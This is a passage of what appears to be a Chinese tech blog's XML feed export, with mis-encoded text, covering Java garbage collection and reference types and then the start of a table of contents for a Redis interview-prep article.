Oldæ”¶é›†å™¨ -</span></h5><p><img src="/2020/03/28/Java-GC/clip_image004.jpg"></p><h5><span id="cmsæ”¶é›†å™¨-">CMSæ”¶é›†å™¨ -</span></h5><p>èµ„æºæ¶ˆè€—å¤§ï¼Œå°½å¯èƒ½ç¼©çŸ­åœé¡¿æ—¶é—´ï¼Œé€‚ç”¨äºå­˜æ´»æ—¶é—´é•¿çš„å¯¹è±¡ã€‚</p><p><img src="/2020/03/28/Java-GC/clip_image006.jpg"></p><p> <img src="/2020/03/28/Java-GC/clip_image008.jpg"></p><h4><span id="g1æ”¶é›†å™¨-">G1æ”¶é›†å™¨ -</span></h4><p><strong>ä½¿ç”¨ â€“XX:+UseG1GC</strong></p><p><strong>ä½¿ç”¨ï¼šå¤åˆ¶+æ ‡è®°-æ•´ç†ç®—æ³•</strong></p><h5><span id="garbage-firstæ”¶é›†å™¨çš„ç‰¹ç‚¹">Garbage Firstæ”¶é›†å™¨çš„ç‰¹ç‚¹</span></h5><p>Ã˜ å¹¶è¡Œå’Œå¹¶å‘</p><p>Ã˜ åˆ†ä»£æ”¶é›†</p><p>Ã˜ ç©ºé—´æ•´åˆ</p><p>Ã˜ å¯é¢„æµ‹çš„åœé¡¿ </p><p><img src="/2020/03/28/Java-GC/clip_image010.jpg"></p><p>G1æ”¶é›†å™¨çš„è¿ä½œå¤§è‡´å¯åˆ’åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><p>1ã€åˆå§‹æ ‡è®°ï¼ˆInitial Makingï¼‰</p><p>2ã€å¹¶å‘æ ‡è®°ï¼ˆConcurrent Markingï¼‰</p><p>3ã€æœ€ç»ˆæ ‡è®°ï¼ˆFinal Markingï¼‰</p><p>4ã€ç­›é€‰å›æ”¶ï¼ˆLive Data Counting and Evacuationï¼‰</p><p>G1å’ŒParallel Scavengeéƒ½æ²¡ç”¨ä¼ ç»Ÿçš„GCæ¡†æ¶è€Œæ˜¯ç‹¬ç«‹å®ç°çš„ã€‚</p><h3><span id="objectçš„finalizeæ–¹æ³•æ˜¯å¦ä¸cçš„ææ„å‡½æ•°ä½œç”¨ç›¸åŒ-">Objectçš„finalizeï¼ˆï¼‰æ–¹æ³•æ˜¯å¦ä¸C++çš„ææ„å‡½æ•°ä½œç”¨ç›¸åŒ -</span></h3><p>Ã˜ ä¸C++çš„ææ„å‡½æ•°ä¸åŒï¼Œææ„å‡½æ•°è°ƒç”¨ç¡®å®šï¼Œè€Œå®ƒçš„æ˜¯ä¸ç¡®å®šçš„</p><p>Ã˜ <font color="red">å°†æœªè¢«å¼•ç”¨çš„å¯¹è±¡æ”¾ç½®äºF-Queueé˜Ÿåˆ—</font></p><p>Ã˜ æ–¹æ³•æ‰§è¡Œéšæ—¶å¯èƒ½è¢«ç»ˆæ­¢</p><p>Ã˜ ç»™äºˆå¯¹è±¡æœ€åä¸€æ¬¡é‡ç”Ÿçš„æœºä¼š</p><p><img src="/2020/03/28/Java-GC/clip_image002-1585388167455.jpg"></p><p>å…¶å®æ˜¯ä¸ç¬¦åˆé¢„æœŸçš„ï¼ˆè¿˜æ²¡æœ‰æ‰§è¡Œfinalization&#x3D;thisçš„æ“ä½œï¼‰å› æ­¤åŠ ä¸Šsleep </p><p><img src="/2020/03/28/Java-GC/clip_image004-1585388167455.jpg"></p><p>ä¸ºå¯¹è±¡åˆ›é€ ä¸€æ¬¡é‡ç”Ÿçš„æœºä¼šã€‚ä½†æ˜¯ä¸ç¡®å®šæ€§è¾ƒå¤§ï¼Œæ— æ³•ä¿è¯å„å¯¹è±¡çš„è°ƒç”¨é¡ºåºï¼ŒåŒæ—¶è¿è¡Œä»£ä»·ç›¸å½“é«˜æ˜‚ï¼Œä¸å»ºè®®ä½¿ç”¨finalizeæ–¹æ³•ã€‚</p><p>Få·²ç»æ˜¯ç©ºæŒ‡é’ˆäº†ï¼Œä½†æ˜¯fæŒ‡å‘çš„å¯¹è±¡è¿˜æ˜¯æœ‰finalizationæŒ‡å‘çš„ã€‚</p><p><img src="/2020/03/28/Java-GC/clip_image006-1585388167455.jpg"></p><h3><span id="javaä¸­çš„å¼ºå¼•ç”¨è½¯å¼•ç”¨å¼±å¼•ç”¨è™šå¼•ç”¨æœ‰ä»€ä¹ˆç”¨">Javaä¸­çš„å¼ºå¼•ç”¨ï¼Œè½¯å¼•ç”¨ï¼Œå¼±å¼•ç”¨ï¼Œè™šå¼•ç”¨æœ‰ä»€ä¹ˆç”¨</span></h3><h4><span id="å¼ºå¼•ç”¨strong-reference">å¼ºå¼•ç”¨ï¼ˆStrong Referenceï¼‰âˆš</span></h4><p>Ã˜ æœ€æ™®éçš„å¼•ç”¨ï¼šObject obj&#x3D;new Object()</p><p>Ã˜ æŠ›å‡ºOutOfMemoryErrorç»ˆæ­¢ç¨‹åºä¹Ÿä¸ä¼šå›æ”¶å…·æœ‰å¼ºå¼•ç”¨çš„å¯¹è±¡</p><p>Ã˜ é€šè¿‡å°†å¯¹è±¡è®¾ç½®æˆnullæ¥å¼±åŒ–å¼•ç”¨ï¼Œä½¿å…¶è¢«å›æ”¶</p><h4><span id="è½¯å¼•ç”¨soft-reference">è½¯å¼•ç”¨ï¼ˆSoft Referenceï¼‰âˆš</span></h4><p>Ã˜ å¯¹è±¡å¤„åœ¨æœ‰ç”¨ä½†éå¿…é¡»çš„çŠ¶æ€</p><p>Ã˜ åªæœ‰å½“å†…å­˜ç©ºé—´ä¸è¶³æ—¶ï¼ŒGCä¼šå›æ”¶è¯¥å¼•ç”¨çš„å¯¹è±¡çš„å†…å­˜</p><p>Ã˜ å¯ä»¥ç”¨æ¥å®ç°é«˜é€Ÿç¼“å­˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);<span class="comment">// å¼ºå¼•ç”¨</span></span><br><span class="line">SoftReference&lt;String&gt; softReference = <span class="keyword">new</span> <span class="title class_">SoftReference</span>&lt;&gt;(str);<span class="comment">//è½¯å¼•ç”¨</span></span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥é…åˆå¼•ç”¨é˜Ÿåˆ—ä½¿ç”¨</p><h4><span id="å¼±å¼•ç”¨weak-reference">å¼±å¼•ç”¨ï¼ˆWeak Referenceï¼‰âˆš</span></h4><p>Ã˜ éå¿…é¡»çš„å¯¹è±¡ï¼Œæ¯”è½¯å¼•ç”¨æ›´å¼±ä¸€äº›</p><p>Ã˜ GCæ—¶ä¼šè¢«å›æ”¶</p><p>Ã˜ è¢«å›æ”¶çš„æ¦‚ç‡ä¹Ÿä¸å¤§ï¼Œå› ä¸ºGCçº¿ç¨‹ä¼˜å…ˆçº§æ¯”è¾ƒä½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);<span class="comment">// å¼ºå¼•ç”¨</span></span><br><span class="line">WeakReference&lt;String&gt; weakReference = <span class="keyword">new</span> <span class="title class_">WeakReference</span>&lt;&gt;(str);<span class="comment">//å¼±å¼•ç”¨</span></span><br></pre></td></tr></table></figure><h4><span id="è™šå¼•ç”¨phantomreference-">è™šå¼•ç”¨ï¼ˆPhantomReferenceï¼‰-</span></h4><p>Ã˜ ä¸ä¼šå†³å®šå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸ</p><p>Ã˜ ä»»ä½•æ—¶å€™éƒ½å¯èƒ½è¢«åƒåœ¾æ”¶é›†å™¨å›æ”¶</p><p>Ã˜ è·Ÿè¸ªå¯¹è±¡è¢«åƒåœ¾æ”¶é›†å™¨å›æ”¶çš„æ´»åŠ¨ï¼Œèµ·å“¨å…µä½œç”¨</p><p>Ã˜ å¿…é¡»å’Œå¼•ç”¨é˜Ÿåˆ—ReferenceQueueè”åˆä½¿ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);<span class="comment">// å¼ºå¼•ç”¨</span></span><br><span class="line"><span class="type">ReferenceQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceQueue</span>();</span><br><span class="line">PhantomReference&lt;String&gt; ref = <span class="keyword">new</span> <span class="title class_">PhantomReference</span>&lt;&gt;(str,queue);<span class="comment">//å¼±å¼•ç”¨</span></span><br></pre></td></tr></table></figure><p> <img src="/2020/03/28/Java-GC/clip_image008-1585388167455.jpg"></p><p> <img src="/2020/03/28/Java-GC/clip_image010-1585388167455.jpg"></p><h3><span id="å¼•ç”¨é˜Ÿåˆ—referencequeue-">å¼•ç”¨é˜Ÿåˆ—ReferenceQueue -</span></h3><p>Ã˜ æ— å®é™…å­˜å‚¨ç»“æ„ï¼Œå‚¨å­˜é€»è¾‘ä¾èµ–äºå†…éƒ¨èŠ‚ç‚¹ä¹‹é—´çš„å…³ç³»æ¥è¡¨è¾¾</p><p>Ã˜ å­˜å‚¨å…³è”çš„ä¸”è¢«GCçš„è½¯å¼•ç”¨ï¼Œå¼±å¼•ç”¨å’Œè™šå¼•ç”¨</p><p>èŠ‚ç‚¹æ˜¯referenceæœ¬èº«ï¼Œqueueæ˜¯ç±»ä¼¼é“¾è¡¨çš„ç»“æ„</p><p><img src="/2020/03/28/Java-GC/clip_image012.jpg"></p><p><img src="/2020/03/28/Java-GC/clip_image014.jpg"></p><p><img src="/2020/03/28/Java-GC/clip_image016.jpg"></p><p><img src="/2020/03/28/Java-GC/clip_image018.jpg"></p><p><img src="/2020/03/28/Java-GC/clip_image020.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redisè¿›é˜¶ã€è½¬ã€‘</title>
      <link href="/2020/03/27/redis-advance/"/>
      <url>/2020/03/27/redis-advance/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç›˜ç‚¹äº†å¸¸è€ƒçš„Redisè¿›é˜¶çŸ¥è¯†ç‚¹</p><span id="more"></span><!-- toc --><ul><li><a href="#%E9%A1%B9%E7%9B%AE%E4%B8%AD%E7%BC%93%E5%AD%98%E6%98%AF%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E7%9A%84%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8%E7%BC%93%E5%AD%98%E7%BC%93%E5%AD%98%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E4%BC%9A%E9%80%A0%E6%88%90%E4%BB%80%E4%B9%88%E5%90%8E%E6%9E%9C">é¡¹ç›®ä¸­ç¼“å­˜æ˜¯å¦‚ä½•ä½¿ç”¨çš„ï¼Ÿä¸ºä»€ä¹ˆè¦ç”¨ç¼“å­˜ï¼Ÿç¼“å­˜ä½¿ç”¨ä¸å½“ä¼šé€ æˆä»€ä¹ˆåæœï¼Ÿ</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90">é¢è¯•é¢˜å‰–æ</a><ul><li><a href="#%E9%A1%B9%E7%9B%AE%E4%B8%AD%E7%BC%93%E5%AD%98%E6%98%AF%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E7%9A%84">é¡¹ç›®ä¸­ç¼“å­˜æ˜¯å¦‚ä½•ä½¿ç”¨çš„ï¼Ÿ</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8%E7%BC%93%E5%AD%98">ä¸ºä»€ä¹ˆè¦ç”¨ç¼“å­˜ï¼Ÿ</a><ul><li><a href="#%E9%AB%98%E6%80%A7%E8%83%BD">é«˜æ€§èƒ½</a></li><li><a href="#%E9%AB%98%E5%B9%B6%E5%8F%91">é«˜å¹¶å‘</a></li></ul></li><li><a href="#%E7%94%A8%E4%BA%86%E7%BC%93%E5%AD%98%E4%B9%8B%E5%90%8E%E4%BC%9A%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E8%89%AF%E5%90%8E%E6%9E%9C">ç”¨äº†ç¼“å­˜ä¹‹åä¼šæœ‰ä»€ä¹ˆä¸è‰¯åæœï¼Ÿ</a></li></ul></li></ul></li><li><a href="#redis-%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%88%86%E5%88%AB%E5%9C%A8%E5%93%AA%E4%BA%9B%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%BD%BF%E7%94%A8%E6%AF%94%E8%BE%83%E5%90%88%E9%80%82">redis éƒ½æœ‰å“ªäº›æ•°æ®ç±»å‹ï¼Ÿåˆ†åˆ«åœ¨å“ªäº›åœºæ™¯ä¸‹ä½¿ç”¨æ¯”è¾ƒåˆé€‚ï¼Ÿ</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90-1">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90-1">é¢è¯•é¢˜å‰–æ</a><ul><li><a href="#string">string</a></li><li><a href="#hash">hash</a></li><li><a href="#list">list</a></li><li><a href="#set">set</a></li><li><a href="#sorted-set">sorted set</a></li></ul></li></ul></li><li><a href="#redis-%E7%9A%84%E8%BF%87%E6%9C%9F%E7%AD%96%E7%95%A5%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E5%86%85%E5%AD%98%E6%B7%98%E6%B1%B0%E6%9C%BA%E5%88%B6%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%8B-lru-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0">redis çš„è¿‡æœŸç­–ç•¥éƒ½æœ‰å“ªäº›ï¼Ÿå†…å­˜æ·˜æ±°æœºåˆ¶éƒ½æœ‰å“ªäº›ï¼Ÿæ‰‹å†™ä¸€ä¸‹ LRU ä»£ç å®ç°ï¼Ÿ</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90-2">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90-2">é¢è¯•é¢˜å‰–æ</a><ul><li><a href="#redis-%E8%BF%87%E6%9C%9F%E7%AD%96%E7%95%A5">redis è¿‡æœŸç­–ç•¥</a></li><li><a href="#%E5%86%85%E5%AD%98%E6%B7%98%E6%B1%B0%E6%9C%BA%E5%88%B6">å†…å­˜æ·˜æ±°æœºåˆ¶</a></li><li><a href="#%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA-lru-%E7%AE%97%E6%B3%95">æ‰‹å†™ä¸€ä¸ª LRU ç®—æ³•</a></li></ul></li></ul></li><li><a href="#redis-%E7%9A%84%E6%8C%81%E4%B9%85%E5%8C%96%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%E4%B8%8D%E5%90%8C%E7%9A%84%E6%8C%81%E4%B9%85%E5%8C%96%E6%9C%BA%E5%88%B6%E9%83%BD%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E7%BC%BA%E7%82%B9%E6%8C%81%E4%B9%85%E5%8C%96%E6%9C%BA%E5%88%B6%E5%85%B7%E4%BD%93%E5%BA%95%E5%B1%82%E6%98%AF%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%9A%84">redis çš„æŒä¹…åŒ–æœ‰å“ªå‡ ç§æ–¹å¼ï¼Ÿä¸åŒçš„æŒä¹…åŒ–æœºåˆ¶éƒ½æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼ŸæŒä¹…åŒ–æœºåˆ¶å…·ä½“åº•å±‚æ˜¯å¦‚ä½•å®ç°çš„ï¼Ÿ</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90-3">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90-3">é¢è¯•é¢˜å‰–æ</a><ul><li><a href="#redis-%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F">redis æŒä¹…åŒ–çš„ä¸¤ç§æ–¹å¼</a><ul><li><a href="#rdb-%E4%BC%98%E7%BC%BA%E7%82%B9">RDB ä¼˜ç¼ºç‚¹</a></li><li><a href="#aof-%E4%BC%98%E7%BC%BA%E7%82%B9">AOF ä¼˜ç¼ºç‚¹</a></li></ul></li><li><a href="#rdb-%E5%92%8C-aof-%E5%88%B0%E5%BA%95%E8%AF%A5%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9">RDB å’Œ AOF åˆ°åº•è¯¥å¦‚ä½•é€‰æ‹©</a></li></ul></li></ul></li><li><a href="#%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E7%BC%93%E5%AD%98%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%8F%8C%E5%86%99%E4%B8%80%E8%87%B4%E6%80%A7">å¦‚ä½•ä¿è¯ç¼“å­˜ä¸æ•°æ®åº“çš„åŒå†™ä¸€è‡´æ€§ï¼Ÿ</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90-4">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90-4">é¢è¯•é¢˜å‰–æ</a><ul><li><a href="#cache-aside-pattern">Cache Aside Pattern</a></li><li><a href="#%E6%9C%80%E5%88%9D%E7%BA%A7%E7%9A%84%E7%BC%93%E5%AD%98%E4%B8%8D%E4%B8%80%E8%87%B4%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">æœ€åˆçº§çš„ç¼“å­˜ä¸ä¸€è‡´é—®é¢˜åŠè§£å†³æ–¹æ¡ˆ</a></li><li><a href="#%E6%AF%94%E8%BE%83%E5%A4%8D%E6%9D%82%E7%9A%84%E6%95%B0%E6%8D%AE%E4%B8%8D%E4%B8%80%E8%87%B4%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90">æ¯”è¾ƒå¤æ‚çš„æ•°æ®ä¸ä¸€è‡´é—®é¢˜åˆ†æ</a></li></ul></li></ul></li><li><a href="#redis-%E7%9A%84%E5%B9%B6%E5%8F%91%E7%AB%9E%E4%BA%89%E9%97%AE%E9%A2%98%E6%98%AF%E4%BB%80%E4%B9%88%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98%E4%BA%86%E8%A7%A3-redis-%E4%BA%8B%E5%8A%A1%E7%9A%84-cas-%E6%96%B9%E6%A1%88%E5%90%97">redis çš„å¹¶å‘ç«äº‰é—®é¢˜æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜ï¼Ÿäº†è§£ redis äº‹åŠ¡çš„ CAS æ–¹æ¡ˆå—ï¼Ÿ</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90-5">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90-5">é¢è¯•é¢˜å‰–æ</a></li></ul></li><li><a href="#%E4%BA%86%E8%A7%A3%E4%BB%80%E4%B9%88%E6%98%AF-redis-%E7%9A%84%E9%9B%AA%E5%B4%A9-%E7%A9%BF%E9%80%8F%E5%92%8C%E5%87%BB%E7%A9%BFredis-%E5%B4%A9%E6%BA%83%E4%B9%8B%E5%90%8E%E4%BC%9A%E6%80%8E%E4%B9%88%E6%A0%B7%E7%B3%BB%E7%BB%9F%E8%AF%A5%E5%A6%82%E4%BD%95%E5%BA%94%E5%AF%B9%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86-redis-%E7%9A%84%E7%A9%BF%E9%80%8F">äº†è§£ä»€ä¹ˆæ˜¯ redis çš„é›ªå´©ã€ç©¿é€å’Œå‡»ç©¿ï¼Ÿredis å´©æºƒä¹‹åä¼šæ€ä¹ˆæ ·ï¼Ÿç³»ç»Ÿè¯¥å¦‚ä½•åº”å¯¹è¿™ç§æƒ…å†µï¼Ÿå¦‚ä½•å¤„ç† redis çš„ç©¿é€ï¼Ÿ</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90-6">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90-6">é¢è¯•é¢˜å‰–æ</a><ul><li><a href="#%E7%BC%93%E5%AD%98%E9%9B%AA%E5%B4%A9">ç¼“å­˜é›ªå´©</a></li><li><a href="#%E7%BC%93%E5%AD%98%E7%A9%BF%E9%80%8F">ç¼“å­˜ç©¿é€</a></li><li><a href="#%E7%BC%93%E5%AD%98%E5%87%BB%E7%A9%BF">ç¼“å­˜å‡»ç©¿</a></li></ul></li></ul></li><li><a href="#redis-%E4%B8%BB%E4%BB%8E%E6%9E%B6%E6%9E%84">Redis ä¸»ä»æ¶æ„</a><ul><li><a href="#redis-replication-%E7%9A%84%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6">redis replication çš„æ ¸å¿ƒæœºåˆ¶</a></li><li><a href="#redis-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86">redis ä¸»ä»å¤åˆ¶çš„æ ¸å¿ƒåŸç†</a><ul><li><a href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0">ä¸»ä»å¤åˆ¶çš„æ–­ç‚¹ç»­ä¼ </a></li><li><a href="#%E6%97%A0%E7%A3%81%E7%9B%98%E5%8C%96%E5%A4%8D%E5%88%B6">æ— ç£ç›˜åŒ–å¤åˆ¶</a></li><li><a href="#%E8%BF%87%E6%9C%9F-key-%E5%A4%84%E7%90%86">è¿‡æœŸ key å¤„ç†</a></li></ul></li><li><a href="#%E5%A4%8D%E5%88%B6%E7%9A%84%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B">å¤åˆ¶çš„å®Œæ•´æµç¨‹</a><ul><li><a href="#%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6">å…¨é‡å¤åˆ¶</a></li><li><a href="#%E5%A2%9E%E9%87%8F%E5%A4%8D%E5%88%B6">å¢é‡å¤åˆ¶</a></li><li><a href="#heartbeat">heartbeat</a></li><li><a href="#%E5%BC%82%E6%AD%A5%E5%A4%8D%E5%88%B6">å¼‚æ­¥å¤åˆ¶</a></li></ul></li><li><a href="#redis-%E5%A6%82%E4%BD%95%E6%89%8D%E8%83%BD%E5%81%9A%E5%88%B0%E9%AB%98%E5%8F%AF%E7%94%A8">redis å¦‚ä½•æ‰èƒ½åšåˆ°é«˜å¯ç”¨</a></li></ul></li><li><a href="#redis-%E5%93%A8%E5%85%B5%E9%9B%86%E7%BE%A4%E5%AE%9E%E7%8E%B0%E9%AB%98%E5%8F%AF%E7%94%A8">Redis å“¨å…µé›†ç¾¤å®ç°é«˜å¯ç”¨</a><ul><li><a href="#%E5%93%A8%E5%85%B5%E7%9A%84%E4%BB%8B%E7%BB%8D">å“¨å…µçš„ä»‹ç»</a></li><li><a href="#%E5%93%A8%E5%85%B5%E7%9A%84%E6%A0%B8%E5%BF%83%E7%9F%A5%E8%AF%86">å“¨å…µçš„æ ¸å¿ƒçŸ¥è¯†</a></li><li><a href="#redis-%E5%93%A8%E5%85%B5%E4%B8%BB%E5%A4%87%E5%88%87%E6%8D%A2%E7%9A%84%E6%95%B0%E6%8D%AE%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98">redis å“¨å…µä¸»å¤‡åˆ‡æ¢çš„æ•°æ®ä¸¢å¤±é—®é¢˜</a><ul><li><a href="#%E4%B8%A4%E7%A7%8D%E6%83%85%E5%86%B5%E5%92%8C%E5%AF%BC%E8%87%B4%E6%95%B0%E6%8D%AE%E4%B8%A2%E5%A4%B1">ä¸¤ç§æƒ…å†µå’Œå¯¼è‡´æ•°æ®ä¸¢å¤±</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">æ•°æ®ä¸¢å¤±é—®é¢˜çš„è§£å†³æ–¹æ¡ˆ</a></li></ul></li><li><a href="#sdown-%E5%92%8C-odown-%E8%BD%AC%E6%8D%A2%E6%9C%BA%E5%88%B6">sdown å’Œ odown è½¬æ¢æœºåˆ¶</a></li><li><a href="#%E5%93%A8%E5%85%B5%E9%9B%86%E7%BE%A4%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8F%91%E7%8E%B0%E6%9C%BA%E5%88%B6">å“¨å…µé›†ç¾¤çš„è‡ªåŠ¨å‘ç°æœºåˆ¶</a></li><li><a href="#slave-%E9%85%8D%E7%BD%AE%E7%9A%84%E8%87%AA%E5%8A%A8%E7%BA%A0%E6%AD%A3">slave é…ç½®çš„è‡ªåŠ¨çº æ­£</a></li><li><a href="#slave-master-%E9%80%89%E4%B8%BE%E7%AE%97%E6%B3%95">slave-&gt;master é€‰ä¸¾ç®—æ³•</a></li><li><a href="#quorum-%E5%92%8C-majority">quorum å’Œ majority</a></li><li><a href="#configuration-epoch">configuration epoch</a></li><li><a href="#configuration-%E4%BC%A0%E6%92%AD">configuration ä¼ æ’­</a></li></ul></li><li><a href="#redis-%E9%9B%86%E7%BE%A4%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E8%83%BD%E8%AF%B4%E4%B8%80%E4%B8%8B%E4%B9%88%E5%9C%A8%E9%9B%86%E7%BE%A4%E6%A8%A1%E5%BC%8F%E4%B8%8Bredis-%E7%9A%84-key-%E6%98%AF%E5%A6%82%E4%BD%95%E5%AF%BB%E5%9D%80%E7%9A%84%E5%88%86%E5%B8%83%E5%BC%8F%E5%AF%BB%E5%9D%80%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E7%AE%97%E6%B3%95%E4%BA%86%E8%A7%A3%E4%B8%80%E8%87%B4%E6%80%A7-hash-%E7%AE%97%E6%B3%95%E5%90%97">redis é›†ç¾¤æ¨¡å¼çš„å·¥ä½œåŸç†èƒ½è¯´ä¸€ä¸‹ä¹ˆï¼Ÿåœ¨é›†ç¾¤æ¨¡å¼ä¸‹ï¼Œredis çš„ key æ˜¯å¦‚ä½•å¯»å€çš„ï¼Ÿåˆ†å¸ƒå¼å¯»å€éƒ½æœ‰å“ªäº›ç®—æ³•ï¼Ÿäº†è§£ä¸€è‡´æ€§ hash ç®—æ³•å—ï¼Ÿ</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90-7">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90-7">é¢è¯•é¢˜å‰–æ</a><ul><li><a href="#redis-cluster-%E4%BB%8B%E7%BB%8D">redis cluster ä»‹ç»</a></li><li><a href="#%E8%8A%82%E7%82%B9%E9%97%B4%E7%9A%84%E5%86%85%E9%83%A8%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6">èŠ‚ç‚¹é—´çš„å†…éƒ¨é€šä¿¡æœºåˆ¶</a><ul><li><a href="#%E5%9F%BA%E6%9C%AC%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86">åŸºæœ¬é€šä¿¡åŸç†</a></li><li><a href="#gossip-%E5%8D%8F%E8%AE%AE">gossip åè®®</a></li><li><a href="#ping-%E6%B6%88%E6%81%AF%E6%B7%B1%E5%85%A5">ping æ¶ˆæ¯æ·±å…¥</a></li></ul></li><li><a href="#%E5%88%86%E5%B8%83%E5%BC%8F%E5%AF%BB%E5%9D%80%E7%AE%97%E6%B3%95">åˆ†å¸ƒå¼å¯»å€ç®—æ³•</a><ul><li><a 